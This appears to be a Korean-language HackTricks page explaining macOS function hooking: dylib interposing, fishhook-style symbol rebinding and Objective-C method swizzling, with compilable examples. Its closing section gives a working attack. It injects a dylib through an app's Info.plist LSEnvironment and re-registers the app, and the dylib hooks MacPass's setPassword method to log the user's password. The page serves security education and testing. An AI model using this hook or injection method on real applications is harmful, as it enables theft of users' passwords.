# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

**원본** 및 **대체** 함수의 주소를 가리키는 **function pointers** 튜플이 포함된 **`__interpose` (`__DATA___interpose`)** 섹션(또는 **`S_INTERPOSING`** 플래그가 지정된 섹션)을 사용하여 **dylib**를 생성합니다.

그런 다음 **`DYLD_INSERT_LIBRARIES`**를 사용하여 dylib를 **inject**합니다(Interposing은 main app이 로드되기 전에 수행되어야 합니다). 물론 여기에도 [**`DYLD_INSERT_LIBRARIES`** 사용에 적용되는 **restrictions**가 적용됩니다](macos-library-injection/index.html#check-restrictions).

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> **`DYLD_PRINT_INTERPOSING`** env variable은 interposing을 debug하는 데 사용할 수 있으며 interpose process를 출력합니다.

또한 **interposing은 process와 로드된 libraries 사이에서 발생**하며, shared library cache에서는 작동하지 않는다는 점에 유의하세요.

### Dynamic Interposing

이제 **`dyld_dynamic_interpose`** function을 사용하여 function을 동적으로 interpose할 수도 있습니다. 이를 통해 **처음부터** 수행하는 대신 **runtime**에 **programmatically** function을 interpose할 수 있습니다.

필요한 것은 **replace할 function과 replacement function의 **tuples**를 지정하는 것뿐입니다.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Import Table Rebinding (fishhook-style)

이미 **프로세스 내부에서** code execution을 확보했고 target을 relaunch하지 않은 상태에서 **import된 C function**을 hook하려는 경우, 매우 일반적으로 사용되는 primitive는 **symbol rebinding**(**`fishhook`**으로 대중화됨)입니다.

**`__interpose`** section을 사용하는 대신, 이 technique은 Mach-O metadata (`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`)를 순회하고 현재 image가 사용하는 **import slot**을 **overwrite**합니다. 이는 **이미 실행 중인** process의 function을 hook하거나, **`rebind_symbols_image`**를 사용해 **하나의 image만** hook할 때 매우 유용합니다.<sup>[[2]](#references)</sup>

> [!TIP]
> 이는 실제로 **import pointer**를 거치는 call에만 영향을 줍니다. target function이 동일한 image 내부에서 **직접 호출**되는 경우에는 다시 작성할 imported slot이 없으므로, 이 technique은 해당 call site를 확인할 수 없습니다.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
최근 macOS 버전에서는 많은 rebinding 대상이 더 이상 쓰기 가능한 **`__DATA`** 페이지에 있지 않습니다. 일반적으로 rebinder는 포인터를 patch하기 전에 일시적으로 **`__DATA_CONST`**를 쓰기 가능하게 만들어야 합니다. 또한 Apple Silicon / **`arm64e`**에서는 **`__AUTH_CONST.__auth_got`**에 authenticated pointer와 추가 indirection이 있을 것으로 예상해야 하므로, classic lazy/non-lazy symbol pointer section만 스캔하는 rebinder는 일부 call site를 놓칠 수 있습니다.<sup>[[3]](#references)</sup>

> [!CAUTION]
> **`arm64e`** ABI는 많은 function pointer에 **Pointer Authentication (PAC)**을 사용합니다. Intel에서 작동하던 무분별한 pointer write가 Apple Silicon에서는 call site를 손상시킬 수 있습니다. 자체 rebinder 또는 inline hooker를 작성할 때는 **`<ptrauth.h>`**의 **`ptrauth_sign_unauthenticated`** 또는 **`ptrauth_auth_and_resign`** 같은 helper를 사용할 준비를 하고, 특히 **`arm64e`** 대상에서 테스트해야 합니다.

**`__AUTH`**, **`__AUTH_CONST`** 및 **`__auth_got`**에 대한 자세한 내용은 [이 페이지](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md)를 참조하세요.

## Method Swizzling

ObjectiveC에서는 다음과 같은 방식으로 method가 호출됩니다: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

**object**, **method** 및 **params**가 필요합니다. 그리고 method가 호출되면 **msg가 전송**되며, 이때 **`objc_msgSend`** function이 사용됩니다: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

object는 **`someObject`**, method는 **`@selector(method1p1:p2:)`**, arguments는 **value1**, **value2**입니다.

object structure를 따라가면 **name**과 method code에 대한 **pointer**가 **위치한** **method array**에 도달할 수 있습니다.

> [!CAUTION]
> method와 class는 name을 기반으로 access되므로 이 정보가 binary에 저장된다는 점에 유의하세요. 따라서 `otool -ov </path/bin>` 또는 [`class-dump </path/bin>`](https://github.com/nygard/class-dump)를 사용해 이를 확인할 수 있습니다.

### raw methods에 access하기

다음 예제처럼 name, params 수 또는 address와 같은 method 정보를 access할 수 있습니다:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling with method_exchangeImplementations

함수 **`method_exchangeImplementations`**를 사용하면 **한 함수의 구현** **주소를 다른 함수의 구현 주소로** 변경할 수 있습니다.

> [!CAUTION]
> 따라서 함수가 호출되면 **다른 함수가 실행됩니다**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> 이 경우 **legit** 메서드의 **implementation code**가 **method** **name**을 **verifies**하면 이 swizzling을 **detect**하고 실행을 방지할 수 있습니다.
>
> 다음 technique에는 이러한 제한이 없습니다.

### method_setImplementation을 사용한 Method Swizzling

이전 형식은 한 메서드의 implementation을 다른 메서드의 implementation으로 변경하기 때문에 이상합니다. **`method_setImplementation`** 함수를 사용하면 한 **method**의 **implementation**을 다른 메서드의 **implementation**으로 **change**할 수 있습니다.

새 implementation에서 원래 implementation을 호출하려는 경우, 덮어쓰기 전에 **original** implementation의 주소를 **store**해야 한다는 점만 기억하세요. 나중에는 해당 주소를 찾기가 훨씬 더 **complicated**해지기 때문입니다.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack 방법론

이 페이지에서는 functions를 hook하는 다양한 방법을 다뤘습니다. 그러나 이러한 방법은 **공격 대상 process 내부에서 code를 실행하는 것**을 전제로 합니다.

이를 수행하는 가장 쉬운 technique은 [environment variables를 통한 Dyld 또는 hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md)을 사용해 inject하는 것입니다. 하지만 [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port)을 통해서도 가능할 것으로 생각됩니다.

그러나 두 옵션 모두 **unprotected** binaries/processes로 **제한**됩니다. 제한 사항에 대해 자세히 알아보려면 각 technique을 확인하세요.

하지만 function hooking attack은 매우 구체적인 목적을 가집니다. attacker는 **process 내부의 민감한 정보를 탈취하기 위해** 이를 수행합니다(그렇지 않다면 단순히 process injection attack을 수행했을 것입니다). 그리고 이 민감한 정보는 MacPass와 같이 사용자가 download한 Apps에 있을 수 있습니다.

따라서 attacker vector는 vulnerability를 찾거나 application의 signature를 제거한 다음, application의 Info.plist를 통해 **`DYLD_INSERT_LIBRARIES`** env variable을 inject하고 다음과 같은 내용을 추가하는 것입니다:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
그런 다음 애플리케이션을 **다시 등록**하세요:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
해당 library에 정보를 exfiltrate하는 hooking code를 추가합니다: Passwords, messages...

> [!CAUTION]
> 최신 버전의 macOS에서는 애플리케이션 binary의 **signature를 제거**했으며 해당 애플리케이션이 이전에 실행된 적이 있다면 macOS가 더 이상 **애플리케이션을 실행하지 않습니다**.

#### Library 예시
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## References

- [1] [Method Swizzling - NSHipster](https://nshipster.com/method-swizzling/)
- [2] [facebook/fishhook: Mach-O 바이너리에서 symbols를 동적으로 rebinding하는 과정을 간소화하는 library](https://github.com/facebook/fishhook)
- [3] [Pointer Authentication — Clang Documentation](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
